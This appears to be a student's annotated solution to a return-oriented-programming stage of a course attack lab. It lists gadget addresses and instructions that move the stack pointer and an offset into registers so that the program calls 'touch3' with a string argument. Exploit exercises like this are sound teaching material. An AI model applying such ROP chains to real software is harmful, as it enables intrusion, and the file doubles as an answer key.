/* save the stack pointer address on rdi */
mov %rsp, %rax     401a06
mov %rax, %rdi	   4019a2

/* pop the offset which is $8*9 (9 is the number of instructions) as 0x48 */
pop %rax           4019ab

/* put the offset from rax to rsi, here we use eax esi because have not that instruction */
mov %eax, %edx     401a55 or 4019dd must the latter one
mov %edx, %ecx     4019f8 or 401a70 also must the latter one
mov %ecx, %esi     401a13

/* get the string and put it on rdi which is the first parameter register */
lea (%rdi,%rsi,1),%rax   4019d6
mov rax, rdi       4019a2

touch3 				4018fa

